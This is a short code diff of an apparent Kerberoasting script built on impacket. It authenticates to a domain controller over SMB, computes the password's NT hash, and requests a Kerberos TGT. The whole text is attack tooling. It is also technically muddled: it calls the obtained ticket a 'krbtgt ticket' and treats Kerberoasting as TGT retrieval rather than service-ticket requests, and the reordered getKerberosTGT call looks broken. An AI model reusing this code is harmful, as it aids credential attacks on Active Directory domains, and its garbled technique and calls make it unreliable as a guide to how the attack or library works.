@@ -5,15 +5,15 @@ from impacket.ntlm import compute_nthash
 
 def kerberoast(username, password, domain, dc_ip):
     try:
-        # Compute the NT hash of the password
-        nthash = compute_nthash(password)
-
         # Connect to the Domain Controller via SMB
         smb = SMBConnection(dc_ip, dc_ip)
         smb.login(username, password, domain)
 
+        # Compute the NT hash of the password
+        nthash = compute_nthash(password)
+
         # Get TGT ticket for the specified user
-        krbtgt_ticket = getKerberosTGT(username, nthash, domain, dc_ip)
+        krbtgt_ticket = getKerberosTGT(username, domain, dc_ip, nthash)
         if krbtgt_ticket:
             print("Successfully obtained krbtgt ticket.")
             
